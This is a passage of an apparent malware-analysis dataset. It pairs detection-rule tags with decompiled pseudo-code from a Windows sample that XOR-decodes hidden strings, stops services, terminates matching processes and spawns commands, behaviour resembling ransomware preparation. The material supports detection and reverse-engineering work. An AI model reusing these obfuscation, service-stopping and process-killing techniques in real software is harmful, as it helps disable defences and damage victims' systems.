0x6f;\n    uStack00000023 = 0x53;\n    uStack00000061 = 0;\n    uStack000000a1 = 0;\n    uStack0000003d = 0;\n    uStack00000025 = 0x6c;\n    uStack00000029 = 0x76;\n    uStack0000008e = 0x3c;\n    uStack00000026 = 0x73;\n    uStack00000027 = 0x65;\n    uStack0000002a = 0x72;\n    uStack0000008f = 0x73;\n    uStack00000095 = 0x6e;\n    uStack00000091 = 0x6c;\n    uStack00000092 = 0x61;\n    uStack00000093 = 0x67;\n    uStack00000096 = 0x74;\n    uStack00000085 = 0x73;\n    uStack00000086 = 0x71;\n    uStack0000008b = 0x6c;\n    uStack00000087 = 0x6c;\n    uStack00000089 = 100;\n    uStack0000008a = 0x68;\n    uStack0000002b = 0;\n    uStack00000097 = 0;\n    uStack0000008d = 0;\n    uStack000000fa = 0x29;\n    uStack000000fb = 0x43;\n    uStack000000fd = 0x6c;\n    uStack000000fe = 0x73;\n    uStack00000101 = 0x76;\n    uStack000000ff = 0x65;\n    uStack00000102 = 0x65;\n    uStack00000103 = 0x72;\n    uStack00000015 = 0x52;\n    uStack00000016 = 0x54;\n    uStack00000017 = 0x56;\n    uStack00000019 = 99;\n    uStack0000001a = 0x61;\n    uStack0000001b = 0x6e;\n    uStack000000d6 = 0x71;\n    uStack000000d5 = 0x73;\n    uStack000000d7 = 0x6c;\n    uStack000000da = 0x6f;\n    uStack000000d9 = 0x72;\n    uStack000000db = 0x77;\n    uStack0000007a = 0x61;\n    uStack000000dd = 0x65;\n    uStack000000de = 0x72;\n    uStack0000007b = 0x53;\n    uStack00000081 = 0x4c;\n    uStack0000007f = 0x44;\n    uStack0000007d = 0x4c;\n    uStack000000df = 0;\n    uStack00000082 = 0x50;\n    uStack0000007e = 0x41;\n    uStack00000083 = 0;\n    fcn.00401df0();\n    uVar8 = 0;\n    do {\n        (&stack0x00000433)[uVar8] = (&stack0x00000433)[uVar8] ^ *0x423ca0;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x15);\n    fcn.00401da0();\n    uStack000000ef = 0x3e;\n    uStack000000f1 = 0x71;\n    uStack000000f6 = 0x74;\n    uStack000000f3 = 0x77;\n    uStack000000f5 = 0x69;\n    uStack000000f7 = 0x65;\n    uStack00000047 = 0x45;\n    uStack000000f2 = 0x6c;\n    uStack0000004a = 0x6d;\n    uStack0000000b = 0x56;\n    uStack0000004d = 0x72;\n    uStack00000049 = 0x73;\n    uStack0000004b = 100;\n    uStack0000004e = 0x76;\n    uStack000000f9 = 0;\n    uStack0000004f = 0;\n    uStack0000000d = 0x6f;\n    uStack0000000e = 0x6d;\n    uStack00000013 = 0;\n    uStack0000000f = 99;\n    uStack00000011 = 0x74;\n    uStack00000012 = 0x36;\n    uVar8 = 0;\n    uStack000001c9 = 0x5e;\n    uStack000001ca = 0x3624;\n    in_stack_000001cc = 0x30313a2b;\n    in_stack_000001d0 = 0x39;\n    uStack000001d1 = 0x39303f38;\n    uStack000001d5 = 0x2b27;\n    do {\n        (&stack0x000001ca)[uVar8] = (&stack0x000001ca)[uVar8] ^ 0x5e;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xd);\n    uVar8 = 0;\n    uStack000001d7 = 0;\n    do {\n        (&stack0x0000044a)[uVar8] = (&stack0x0000044a)[uVar8] ^ *0x423ba0;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x15);\n    uVar8 = 0;\n    do {\n        (&stack0x0000062d)[uVar8] = (&stack0x0000062d)[uVar8] ^ *0x423ed0;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x10);\n    uStack0000003e = 0x73;\n    uStack0000003f = 100;\n    uStack00000043 = 0x76;\n    uStack00000042 = 0x72;\n    uStack00000041 = 0x73;\n    uStack00000045 = 0x32;\n    uStack00000051 = 100;\n    uStack00000052 = 0x62;\n    uStack00000055 = 0x67;\n    uStack00000053 = 0x65;\n    uStack00000056 = 0x38;\n    uStack00000046 = 0;\n    uStack00000057 = 0;\n    fcn.00401e40();\n    fcn.00401da0();\n    uVar8 = 0;\n    do {\n        (&stack0x00000461)[uVar8] = (&stack0x00000461)[uVar8] ^ *0x423da0;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x15);\n    uStack0000011e = 0xe;\n    uStack0000011f = 0x53;\n    uStack00000121 = 0x4c;\n    uStack00000122 = 0x42;\n    uStack00000125 = 0x77;\n    uStack00000126 = 0x73;\n    uStack00000127 = 0x65;\n    uStack00000123 = 0x72;\n    uStack000000e5 = 0x53;\n    uStack000000e6 = 0x51;\n    uStack000000eb = 0x74;\n    uStack000000e7 = 0x4c;\n    uStack000000ea = 0x69;\n    uStack000000ed = 0x72;\n    uStack000000e9 = 0x72;\n    uVar8 = 0;\n    uStack00000129 = 0;\n    uStack000000ee = 0;\n    in_stack_000001d8 = 0x4c56793f;\n    in_stack_000001dc = 0x48505d57;\n    in_stack_000001e0 = 0x6c467253;\n    in_stack_000001e4 = 0x736e;\n    do {\n        puVar9 = &stack0x000001d8 + uVar8 + 1;\n        *puVar9 = *puVar9 ^ 0x3f;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xd);\n    uStack000001e6 = 0;\n    fcn.00401e40();\n    uStack00000105 = 0x67;\n    uStack00000106 = 0x4d;\n    uStack0000010a = 0x4c;\n    uStack00000107 = 0x79;\n    uStack00000109 = 0x51;\n    uStack0000010b = 0x35;\n    uVar8 = 0;\n    uStack0000010d = 0;\n    do {\n        (&stack0x00000403)[uVar8] = (&stack0x00000403)[uVar8] ^ *0x423e10;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x16);\n    uVar8 = 0;\n    do {\n        (&stack0x0000041b)[uVar8] = (&stack0x0000041b)[uVar8] ^ *0x423d90;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x16);\n    fcn.00401000();\n    uVar8 = 0;\n    do {\n        (&stack0x0000061a)[uVar8] = (&stack0x0000061a)[uVar8] ^ *0x423d60;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x11);\n    fcn.00401040();\n    uVar8 = 0;\n    do {\n        (&stack0x000004be)[uVar8] = (&stack0x000004be)[uVar8] ^ str._7__k88:O8_8_____F_a___._4_4_;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x13);\n    fcn.00401c50();\n    uVar8 = 0;\n    do {\n        (&stack0x000003b0)[uVar8] = (&stack0x000003b0)[uVar8] ^ *0x423cf0;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x1d);\n    uVar8 = 0;\n    do {\n        (&stack0x000003cf)[uVar8] = (&stack0x000003cf)[uVar8] ^ *0x423f00;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x1a);\n    uVar8 = 0;\n    do {\n        (&stack0x000003eb)[uVar8] = (&stack0x000003eb)[uVar8] ^ *0x423b80;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x16);\n    uVar8 = 0;\n    do {\n        (&stack0x000004d3)[uVar8] = (&stack0x000004d3)[uVar8] ^ *0x423ce0;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x13);\n    in_stack_00000154 = 0x22263564;\n    uVar8 = 0;\n    in_stack_00000158 = 0x16013727;\n    in_stack_0000015c = 0x1070d12;\n    do {\n        puVar9 = &stack0x00000154 + uVar8 + 1;\n        *puVar9 = *puVar9 ^ 100;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xb);\n    in_stack_00000160 = 0;\n    uStack0000017b = 0x73;\n    in_stack_00000180 = CONCAT31(in_stack_00000180 >> 8 & 0xffff00, 0x53);\n    in_stack_0000017c = 0x53564251;\n    fcn.00401e80();\n    uStack00000117 = 0x56;\n    uStack00000119 = 0x6f;\n    uStack0000011a = 0x6f;\n    uStack0000011d = 0;\n    uStack0000012e = 0;\n    uStack0000011b = 0x49;\n    uStack0000012a = 0x53;\n    uStack00000021 = 0;\n    uStack0000012d = 0x73;\n    uStack0000012b = 0x76;\n    uStack0000001d = 0x58;\n    uStack0000001e = 0x73;\n    uStack0000001f = 0x71;\n    in_stack_0000013c = 0x44;\n    uStack0000013d = 0x73;\n    uStack00000062 = 0x39;\n    uStack0000013e = 0x76;\n    uStack0000013f = 99;\n    in_stack_00000140 = 0x24;\n    _uStack00000188 = CONCAT11(0x6d, uStack00000188);\n    uStack0000006a = 0x34;\n    Stack00000188 = CONCAT12(0x4d, _uStack00000188);\n    uStack00000072 = 2;\n    in_stack_00000188 = CONCAT13(0x53, Stack00000188);\n    uStack00000063 = 0x4d;\n    uStack00000141 = 0;\n    uStack00000065 = 0x53;\n    uStack00000066 = 0x51;\n    uStack00000067 = 0x4c;\n    in_stack_0000018c = 0x4c5153;\n    uStack00000069 = 0;\n    uStack00000071 = 0;\n    uStack0000006b = 0x6d;\n    uStack0000006d = 0x6d;\n    uStack0000006e = 0x74;\n    uStack0000006f = 0x61;\n    uStack00000073 = 0x6d;\n    uStack000000b2 = 0x39;\n    uStack00000075 = 0x70;\n    uStack00000076 = 0x6f;\n    uStack00000077 = 99;\n    uStack000000a2 = 0x27;\n    uStack000000b3 = 0x73;\n    uStack000000b5 = 0x70;\n    uStack000000b7 = 0x6f;\n    uStack000000b6 = 0x68;\n    uStack00000079 = 0;\n    uStack000000b9 = 0;\n    in_stack_00000190 = 0x65657615;\n    uStack000000a9 = 0;\n    uStack000000a3 = 0x62;\n    uStack000000a5 = 99;\n    uStack000000a6 = 0x6b;\n    uStack000000a7 = 0x75;\n    in_stack_00000194 = 0x2f006d61;\n    in_stack_0000019c = 0x67;\n    in_stack_00000198 = 0x62646562;\n    uStack0000019d = 0;\n    fcn.00401df0();\n    fcn.00401040();\n    fcn.00401ed0();\n    fcn.00401f00();\n    fcn.00401f30();\n    uVar8 = 0;\n    do {\n        (&stack0x000004a9)[uVar8] = (&stack0x000004a9)[uVar8] ^ *0x423e70;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x13);\n    fcn.00401f70();\n    iVar11 = 0x7c76696d;\n    fcn.00401e40();\n    uStack0000010e = 0x2f;\n    uStack0000010f = 0x4d;\n    uStack00000113 = 0x6d;\n    uStack00000111 = 0x41;\n    uStack00000112 = 0x72;\n    uStack00000115 = 0x72;\n    uStack00000116 = 0;\n    fcn.00401e80();\n    uStack000001e7 = 0x2d3a3d4e;\n    uVar8 = 0;\n    uStack000001eb = 0x392f3c11;\n    uStack000001ef = 0x2b292f11;\n    uStack000001f3 = 0x3a20;\n    do {\n        (&stack0x000001e8)[uVar8] = (&stack0x000001e8)[uVar8] ^ 0x4e;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xd);\n    uStack000001f5 = 0;\n    fcn.00401fb0();\n    uVar8 = 0;\n    do {\n        (&stack0x00000496)[uVar8] = (&stack0x00000496)[uVar8] ^ *0x423f60;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x11);\n    fcn.00401f00();\n    uStack0000012f = 0x58586b3d;\n    uVar8 = 0;\n    uStack00000133 = 0x7b73505c;\n    uStack00000137 = 0x5e4b6e6e;\n    do {\n        (&stack0x00000130)[uVar8] = (&stack0x00000130)[uVar8] ^ 0x3d;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xb);\n    uStack0000013b = 0;\n    fcn.00401df0();\n    uStack00000142 = 0x41;\n    uStack00000147 = 0;\n    uStack00000143 = 0x41;\n    uStack00000145 = 0x53;\n    in_stack_00000144 = 0x52;\n    uStack00000146 = 0x4d;\n    fcn.00401ff0();\n    uVar8 = 0;\n    do {\n        (&stack0x000001f7)[uVar8] = (&stack0x000001f7)[uVar8] ^ 8;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xd);\n    fcn.00402040();\n    uStack0000016f = 0x58;\n    in_stack_00000170 = 0x4d5c;\n    uStack00000172 = 0x774a;\n    in_stack_00000174 = 0x676c;\n    uStack00000176 = 0x616e;\n    in_stack_00000178 = 0x6a68;\n    uVar8 = 0;\n    do {\n        uStack0000016e = 0xf;\n        (&stack0x0000016f)[uVar8] = (&stack0x0000016f)[uVar8] ^ 0xf;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xb);\n    uStack0000017a = 0;\n    fcn.00401ff0();\n    uVar8 = 0;\n    do {\n        (&stack0x00000206)[uVar8] = (&stack0x00000206)[uVar8] ^ 0x24;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xb);\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((iVar1 != 0) || (*(in_FS_OFFSET + 0x34) != 5)) {\n        iVar1 = 0;\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n            pcVar7 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)();\n                pcVar7 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                if (iVar3 == 0) {\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                }\n                else if (iVar11 == 1) {\n                    uVar5 = *(&stack0x00000798 + iVar1 * 4);\n                    uVar6 = fcn.00401da0();\n                    fcn.0040f630(uVar6, uVar5);\n                    pcVar7 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                }\n                else {\n                    while (iVar11 == 3) {\n                        (*_sym.imp.KERNEL32.dll_Sleep)();\n                        iVar3 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)();\n                        if (iVar3 == 0) goto code_r0x00414b85;\n                        if (iVar11 == 1) {\n                            uVar5 = *(&stack0x00000798 + iVar1 * 4);\n                            uVar6 = fcn.00401da0();\n                            fcn.0040f630(uVar6, uVar5);\n                            goto code_r0x00414b85;\n                        }\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                        if (30000 < uVar8) {\ncode_r0x00414b85:\n                            iVar1 = iVar1 + 1;\n                            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                        }\n                    }\n                    fcn.00416800();\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_ControlService)();\n                    pcVar7 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                    if (iVar3 != 0) {\njoined_r0x00414bd1:\n                        pcVar7 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                        if (in_stack_000006ec != 1) {\n                            (*_sym.imp.KERNEL32.dll_Sleep)();\n                            iVar3 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)();\n                            if (iVar3 == 0) goto code_r0x00414c27;\n                            if (in_stack_000006ec != 1) goto code_r0x00414c16;\n                            uVar5 = *(&stack0x000007ac + iVar1 * 4);\n                            uVar6 = fcn.00401da0();\n                            fcn.0040f630(uVar6, uVar5);\n                            pcVar7 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                        }\n                        goto code_r0x00414c77;\n                    }\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                }\n            }\ncode_r0x00414c77:\n            iVar1 = iVar1 + 1;\n        } while (*(&stack0x000007ac + iVar1 * 4) != 0);\n        (*pcVar7)();\n    }\n    (*_sym.imp.ole32.dll_CoInitializeEx)();\n    fcn.00402070();\n    uStack0000019f = 0x22;\n    uStack000001a5 = 0;\n    in_stack_000001a0 = 0x72;\n    uStack000001a2 = 0x6e;\n    uStack000001a1 = 0x75;\n    uStack000001a3 = 0x61;\n    in_stack_000001a4 = 0x73;\n    puVar4 = fcn.00402e10();\n    iVar11 = 199;\n    puVar9 = puVar4;\n    do {\n        puVar9 = puVar9 + 1;\n        *puVar9 = *puVar9 ^ *puVar4;\n        iVar11 = iVar11 + -1;\n    } while (iVar11 != 0);\n    puVar4[200] = 0;\n    fcn.00401fb0();\n    fcn.00401df0();\n    fcn.00401fb0();\n    in_stack_00000188 = in_stack_00000188 & 0xffffff00;\n    in_stack_00000180 = CONCAT13(0x52, CONCAT12(0x46, uStack00000180));\n    in_stack_00000184 = 0x69756741;\n    fcn.00401e80();\n    fcn.00402070();\n    fcn.00401fb0();\n    fcn.00402070();\n    in_stack_00000190 = 0x57425131;\n    in_stack_00000194 = in_stack_00000194 & 0xff000000 | 0x3233;\n    fcn.00402070();\n    fcn.00401fb0();\n    fcn.00401e80();\n    in_stack_0000016c = 0;\n    in_stack_00000164 = CONCAT13(0x68, CONCAT12(0x57, uStack00000164));\n    uStack00000169 = 0x74;\n    in_stack_00000168 = 0x74;\n    uStack0000016a = 0x70;\n    uStack0000016b = 100;\n    fcn.00401ff0();\n    fcn.00401fb0();\n    uStack0000012e = 0x61;\n    uStack0000012d = 0x6a;\n    uStack0000012f = CONCAT31(uStack0000012f >> 8 & 0xff0000 | 0x61, 0x76);\n    _uStack00000188 = CONCAT11(100, uStack00000188);\n    Stack00000188 = CONCAT12(0x33, _uStack00000188);\n    in_stack_00000188 = CONCAT13(0x36, Stack00000188);\n    in_stack_0000018c = 0x657330;\n    fcn.00401e80();\n    fcn.00401e80();\n    uStack000000b1 = 0x66;\n    uStack000000b5 = 0x73;\n    uStack0000008e = 0x25;\n    uStack000000b2 = 100;\n    uStack000000b3 = 0x68;\n    uStack0000008f = 0x47;\n    uStack000000b6 = 0x74;\n    uStack00000091 = 0x73;\n    uStack000000b7 = 0;\n    uStack00000095 = 0;\n    uStack00000092 = 99;\n    uStack00000093 = 0x61;\n    uStack0000019f = 0x50;\n    in_stack_000001a0 = 0x62;\n    uStack000001a1 = 0x7f;\n    uVar8 = 0;\n    uStack000001a2 = 0x4e;\n    uStack000001a3 = 0x65;\n    in_stack_000001a4 = 100;\n    uStack000001a5 = 0x6d;\n    uStack000001a6 = 0x6b4c;\n    in_stack_000001a8 = 0x6d64;\n    uStack000001aa = 0x7f53;\n    do {\n        uStack0000019e = 10;\n        (&stack0x0000019f)[uVar8] = (&stack0x0000019f)[uVar8] ^ 10;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xd);\n    in_stack_000001ac = in_stack_000001ac & 0xffffff00;\n    fcn.00401fb0();\n    uStack0000009e = 0xf;\n    uStack0000009f = 0x6d;\n    uStack000000a1 = 0x73;\n    uStack000000a2 = 0x71;\n    uStack000000a3 = 0x6c;\n    uStack000000a5 = 0;\n    fcn.00401da0();\n    fcn.00401df0();\n    fcn.00402040();\n    fcn.004032e0();\n    fcn.00401040();\n    fcn.00401fb0();\n    fcn.00401c50();\n    uStack0000012a = 0x50;\n    uStack0000012b = 0x6e;\n    uStack0000012d = 100;\n    uStack0000012e = 0x65;\n    uStack0000012f = uStack0000012f & 0xffffff00;\n    fcn.00402040();\n    fcn.00401df0();\n    uStack0000013e = 0x7c;\n    uStack0000013f = 0x76;\n    in_stack_00000140 = 0x61;\n    uVar8 = 0;\n    uStack00000141 = 0x6c;\n    uStack00000142 = 0x22;\n    uStack00000143 = 0x78;\n    in_stack_00000144 = 0x60;\n    uStack00000145 = 0x7d;\n    uStack00000146 = 100;\n    uStack00000147 = 0x6a;\n    in_stack_00000148 = 0x7d;\n    do {\n        uStack0000013d = 0xf;\n        (&stack0x0000013e)[uVar8] = (&stack0x0000013e)[uVar8] ^ 0xf;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0xb);\n    uStack00000149 = 0;\n    fcn.00401e40();\n    fcn.004020b0();\n    fcn.00401ff0();\n    fcn.00403320();\n    fcn.00401e80();\n    fcn.00403340();\n    fcn.004020f0();\n    fcn.00403380();\n    fcn.00401040();\n    fcn.004033c0();\n    fcn.00402070();\n    fcn.004033e0();\n    fcn.00401fb0();\n    fcn.00403400();\n    fcn.00401fb0();\n    fcn.00403420();\n    fcn.00402120();\n    fcn.00403440();\n    fcn.00402150();\n    fcn.00403480();\n    fcn.00401da0();\n    fcn.004034b0();\n    fcn.00401ff0();\n    fcn.004034d0();\n    fcn.004021a0();\n    fcn.004034f0();\n    fcn.004021a0();\n    fcn.00403510();\n    fcn.004021a0();\n    fcn.00403530();\n    fcn.004021d0();\n    fcn.00403550();\n    fcn.00402070();\n    fcn.00403570();\n    fcn.004021a0();\n    fcn.00403590();\n    fcn.00402200();\n    fcn.004035a0();\n    fcn.004021a0();\n    fcn.004035c0();\n    fcn.00402220();\n    fcn.004035e0();\n    fcn.004021a0();\n    fcn.00403600();\n    fcn.00401fb0();\n    fcn.00403620();\n    fcn.00402070();\n    fcn.00403640();\n    fcn.00402120();\n    fcn.00403660();\n    fcn.00401e80();\n    fcn.00403680();\n    fcn.00401c50();\n    fcn.004036b0();\n    fcn.00401ff0();\n    fcn.004036d0();\n    fcn.004021a0();\n    fcn.004036f0();\n    fcn.00402070();\n    fcn.00403710();\n    fcn.00402120();\n    fcn.00403730();\n    fcn.00401df0();\n    fcn.00403750();\n    fcn.00402220();\n    fcn.00403770();\n    fcn.00402070();\n    fcn.00403790();\n    fcn.00402040();\n    fcn.004037b0();\n    fcn.00402220();\n    fcn.004037d0();\n    fcn.00401fb0();\n    fcn.004037f0();\n    fcn.00401fb0();\n    fcn.00403810();\n    fcn.00402220();\n    fcn.00403830();\n    fcn.00402070();\n    fcn.00403850();\n    fcn.00402070();\n    fcn.00403870();\n    fcn.00401fb0();\n    fcn.00403890();\n    fcn.00402220();\n    fcn.004038b0();\n    fcn.004021a0();\n    fcn.004038d0();\n    fcn.00402120();\n    fcn.004038f0();\n    fcn.00402220();\n    fcn.00403910();\n    fcn.00402070();\n    fcn.00403930();\n    fcn.00402220();\n    fcn.00403950();\n    fcn.00402220();\n    fcn.00403970();\n    fcn.00402070();\n    fcn.00403990();\n    fcn.00402070();\n    fcn.004039b0();\n    in_stack_000001cc = fcn.004021a0();\n    fcn.004039d0();\n    uVar5 = fcn.00401fb0();\n    in_stack_000001c8 = uVar5;\n    uStack000001c9 = uVar5 >> 8;\n    uStack000001ca = uVar5 >> 0x10;\n    fcn.004039f0();\n    fcn.00402250();\n    fcn.00403a20();\n    fcn.00401fb0();\n    fcn.00403a40();\n    fcn.00401ff0();\n    fcn.00403a60();\n    fcn.00401c50();\n    fcn.00403a90();\n    fcn.00401c50();\n    fcn.00403ac0();\n    fcn.00401da0();\n    fcn.004124f0(&stack0x00000d0c, 0, 0x128);\n    (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)();\n    (*_sym.imp.KERNEL32.dll_Process32First)();\n    do {\n        iVar11 = fcn.00412570();\n        fcn.004124d0(&stack0x00000f5c, &stack0x00000d20, iVar11 + 1);\n        (*_sym.imp.SHLWAPI.dll_PathRemoveExtensionA)();\n        iVar1 = 0;\n        for (iVar11 = extraout_ECX; iVar11 != 0; iVar11 = *(&stack0x00000704 + iVar11)) {\n            iVar11 = iVar1 * 4;\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)();\n            if ((iVar2 == 0) && (iVar2 = fcn.00416710(),  iVar2 != 0)) {\n                uVar5 = extraout_ECX_00;\n                fcn.00403af0();\n                uVar6 = fcn.00402280();\n                fcn.0040f630(uVar6, uVar5);\n            }\n            iVar1 = iVar1 + 1;\n        }\n        iVar11 = (*_sym.imp.KERNEL32.dll_Process32Next)();\n    } while (iVar11 != 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    in_stack_0000019c = 0;\n    uStack0000019d = 0;\n    uStack0000019e = 0;\n    uStack0000019f = 0;\n    if (CONCAT22(extraout_var, in_GS) != 0) {\n        fcn.00403b50();\n        fcn.004022b0();\n        fcn.00403b30();\n        fcn.00401fb0();\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n        if (pcVar7 != NULL) {\n            (*pcVar7)();\n        }\n    }\n    (*_sym.imp.SHELL32.dll_ShellExecuteExA)();\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    fcn.00403b90();\n    fcn.00402300();\n    fcn.00403be0();\n    fcn.00402330();\n    fcn.00403c40();\n    in_stack_00000164 = fcn.00402370();\n    fcn.00403cc0();\n    in_stack_00000158 = fcn.004023c0();\n    fcn.00403d10();\n    fcn.00402400();\n    fcn.00403d80();\n    fcn.00402430();\n    fcn.00403dd0();\n    fcn.004020f0();\n    fcn.00403e10();\n    fcn.00401040();\n    fcn.00403e50();\n    fcn.00401ed0();\n    iVar1 = 0;\n    iVar11 = 0;\n    uVar5 = extraout_ECX_01;\n    do {\n        if (*(&stack0x00000540 + iVar11 * 4) == 0) {\n            iVar1 = iVar1 + 1;\n            iVar11 = 0;\n            if (iVar1 == 2) {\n                fcn.00403e90();\n                uVar6 = fcn.00402470();\n                fcn.0040f630(uVar6, uVar5);\n                if (CONCAT22(extraout_var_00, in_GS) != 0) {\n                    fcn.00403f00();\n                    fcn.00402280();\n                    fcn.00403ee0();\n                    fcn.00401fb0();\n                    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n                    pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n                    if (pcVar7 != NULL) {\n                        (*pcVar7)();\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_ExitThread)();\n                pcVar7 = swi(3);\n                (*pcVar7)();\n                return;\n            }\n        }\n        fcn.004124f0(&stack0x00000b50, 0, 0x44);\n        fcn.004124f0(&stack0x00001010, 0, 0x104);\n        uVar10 = fcn.00412570();\n        fcn.004124d0(&stack0x00001010, uVar10 >> 0x20, uVar10 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        iVar11 = iVar11 + 1;\n        uVar5 = extraout_ECX_02;\n    } while( true );\ncode_r0x00414c16:\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    if (30000 < iVar3 - iVar2) {\ncode_r0x00414c27:\n        iVar1 = iVar1 + 1;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    }\n    goto joined_r0x00414bd1;\n}\n",
        "token_count": 12215
    },
    "00417880": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1a8h_2\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00417880(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint uVar10;\n    int32_t *piVar11;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uint32_t uVar14;\n    uint var_1a8h;\n    uint var_198h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_17ch;\n    uint var_fah;\n    uint var_eah;\n    uint var_e6h;\n    uint var_dbh;\n    uint var_cbh;\n    uint var_bbh;\n    uint var_b7h;\n    uint var_b3h;\n    uint var_98h;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ah;\n    uint var_6ah;\n    uint var_66h;\n    uint var_44h;\n    uint var_1ch;\n    uint var_40h;\n    uint var_34h;\n    uint var_25h;\n    uint var_13h;\n    uint var_1h;\n    int32_t iStack484;\n    uint *puStack480;\n    int32_t iStack476;\n    uchar *puStack472;\n    int32_t iStack468;\n    uchar *puStack464;\n    uint *puStack456;\n    uint uStack452;\n    uint uStack448;\n    int32_t iStack444;\n    int32_t iStack440;\n    int32_t iStack436;\n    int32_t iStack432;\n    uint var_1a8h_2;\n    uchar auStack412 [8];\n    uint uStack404;\n    uint uStack400;\n    uint *puStack396;\n    ulong uStack392;\n    uint uStack384;\n    uint var_178h;\n    uint32_t var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_fah_2;\n    uint uStack250;\n    uint uStack246;\n    uint uStack242;\n    uint var_eah_2;\n    ushort var_e6h_2;\n    uint var_e4h_2;\n    uint var_dbh_2;\n    uint uStack219;\n    uint uStack215;\n    uint uStack211;\n    uint var_cbh_2;\n    uint uStack203;\n    uint uStack199;\n    uint uStack195;\n    uint var_bbh_2;\n    uint var_b7h_2;\n    uchar var_b3h_2;\n    uint var_b2h;\n    uint uStack178;\n    uint uStack174;\n    uint uStack170;\n    uint var_a2h;\n    uint var_9eh;\n    code *var_9ah;\n    int32_t var_94h;\n    int32_t *var_90h;\n    int32_t *var_8ch;\n    code *var_88h_2;\n    uint var_84h_2;\n    uchar *var_80h_2;\n    uint uStack126;\n    uint uStack122;\n    uint uStack118;\n    uint uStack114;\n    uint uStack110;\n    uint32_t uStack106;\n    uint var_62h;\n    uint uStack98;\n    uint uStack94;\n    uint uStack90;\n    uint var_52h;\n    uint var_4eh;\n    uint var_4ah;\n    uint16_t var_46h;\n    int32_t *var_44h_2;\n    uint var_40h_2;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h_2;\n    int32_t var_30h;\n    uint var_2ch;\n    uchar uStack41;\n    uchar uStack40;\n    uchar uStack39;\n    uchar uStack38;\n    uchar 